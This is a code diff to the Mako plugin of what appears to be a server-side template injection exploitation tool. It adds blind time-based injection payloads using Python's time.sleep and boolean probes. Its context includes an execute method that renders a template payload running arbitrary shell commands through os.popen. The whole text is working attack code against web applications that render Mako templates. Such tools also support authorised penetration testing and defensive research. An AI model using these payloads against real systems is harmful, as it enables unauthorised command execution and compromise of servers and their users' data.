@@ -31,8 +31,13 @@ class Mako(Plugin):
             'evaluate': '<%% %(code)s %%>'
         },
         'blind' : {
+            'call': 'blind_evaluate',
+            'bool_true' : '"a".join("ab") == "aab"',
+            'bool_false' : 'True == False'
+        },
+        'blind_evaluate_bool' : {
             'call': 'inject',
-            'blind': """<%% (%(code)s) and __import__("time").sleep(%(delay)i) %%>"""
+            'blind_evaluate_bool': """<%% %(code)s and __import__("time").sleep(%(delay)i) %%>"""
         }
 
     }
@@ -88,3 +93,12 @@ class Mako(Plugin):
     def execute(self, command):
 
         return self.render("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
+
+    def detect_blind_engine(self):
+
+        if not self.get('blind'):
+            return
+
+        self.set('language', 'python')
+        self.set('engine', 'mako')
+        self.set('eval', 'python')
